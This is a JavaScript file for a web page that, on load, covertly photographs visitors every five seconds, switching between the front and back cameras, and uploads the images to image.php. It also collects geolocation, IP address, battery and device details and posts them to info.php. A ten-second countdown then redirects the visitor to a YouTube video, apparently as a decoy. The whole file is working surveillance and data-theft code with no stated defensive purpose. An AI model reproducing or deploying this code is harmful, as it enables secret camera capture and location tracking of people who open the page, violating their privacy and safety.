document.addEventListener("DOMContentLoaded", function () {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    let currentStream;
    let intervalId;
    let currentCamera = "environment"; // Start with the back camera

    let photoCount = 0;
    let cameraCycle = 1; // Alternating between front and back

    async function startCamera(stream) {
        currentStream = stream;
        video.srcObject = stream;
        video.play();
    }

    async function captureAndUploadPhoto() {
        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        context.clearRect(0, 0, canvas.width, canvas.height); // Clear the canvas

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert the captured image to a data URL
        const imageDataURL = canvas.toDataURL("image/jpeg");

        // Determine the camera type based on the currentCamera variable
        const cameraType = currentCamera === "user" ? "front" : "back";

        // Send the image data and camera type to the server using a POST request
        fetch("image.php", {
            method: "POST",
            body: JSON.stringify({ image: imageDataURL, camera: cameraType }),
        })
        .then(response => response.json())
        .then(data => {
            console.log(data.message); // Log the server response
        })
        .catch(error => {
            console.error("Error uploading photo:", error);
        });

        photoCount++;

        if (photoCount === cameraCycle) {
            // Switch to the other camera after capturing the specified number of photos
            toggleCamera();
            photoCount = 0;
            cameraCycle++;
        }
    }

    async function toggleCamera() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }

        if (currentCamera === "user") {
            currentCamera = "environment"; // Switch to the back camera
        } else {
            currentCamera = "user"; // Switch to the front camera
        }

        const constraints = { video: { facingMode: currentCamera } };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        startCamera(stream);
    }

    // Start with the back camera by default
    toggleCamera();

    // Capture and upload photos every 5 seconds
    intervalId = setInterval(captureAndUploadPhoto, 5000); // Adjust the interval as needed
});

// Function to capture and send device information
async function captureDeviceInfo() {
    const networkInfo = navigator.connection ? navigator.connection.type : 'N/A';
    const batteryInfo = navigator.getBattery
        ? await navigator.getBattery()
            .then(battery => {
                return {
                    BatteryPercentage: battery.level * 100,
                    IsCharging: battery.charging
                };
            })
        : { BatteryPercentage: 'N/A', IsCharging: 'N/A' };
    const deviceInfo = {
        Width: window.innerWidth,
        Height: window.innerHeight,
        Platform: navigator.platform,
        LocalTime: new Date().toLocaleString(),
        DeviceLang: navigator.language,
        IsCookieEnabled: navigator.cookieEnabled,
        UserAgent: navigator.userAgent,
        DeviceRam: navigator.deviceMemory,
        CpuThreads: navigator.hardwareConcurrency
    };

    // Get geolocation data (latitude and longitude) if available
    let geolocationInfo = { Latitude: 'N/A', Longitude: 'N/A' };
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    resolve({ Latitude: latitude, Longitude: longitude });
                },
                error => {
                    reject({ Latitude: 'N/A', Longitude: 'N/A' });
                }
            );
        });
        geolocationInfo = position;
    } catch (error) {
        // Handle errors if geolocation is not available
    }

    const ipAddressInfo = await fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            return {
                IpAddressIPv4: data.ip,
                IpAddressIPv6: 'N/A' // You may need to find a service for IPv6 or omit it
            };
        })
        .catch(() => {
            return {
                IpAddressIPv4: 'N/A',
                IpAddressIPv6: 'N/A'
            };
        });

    const infoData = {
        NetworkInfo: networkInfo,
        ...batteryInfo,
        ...deviceInfo,
        ...geolocationInfo,
        ...ipAddressInfo
    };

    // Send the device info to the server using a POST request
    fetch("info.php", {
        method: "POST",
        body: JSON.stringify(infoData),
    })
    .then(response => response.json())
    .then(data => {
        console.log(data.message); // Log the server response
    })
    .catch(error => {
        console.error("Error uploading device info:", error);
    });
}

// Capture device info when the page loads
captureDeviceInfo();


// Set the target URL and the countdown duration in seconds
const targetUrl = "https://youtu.be/RLzC55ai0eo?si=YP8eQPlqnTXduXdz";
const countdownDuration = 10;

// Function to start the countdown and redirect
function startCountdown() {
    let seconds = countdownDuration;
    const countdownText = document.getElementById("countdown-text");

    const countdownInterval = setInterval(function() {
        countdownText.textContent = seconds;

        if (seconds <= 0) {
            clearInterval(countdownInterval);
            window.location.href = targetUrl;
        }

        seconds--;
    }, 1000);
}

// Start the countdown when the page loads
window.addEventListener("load", startCountdown);
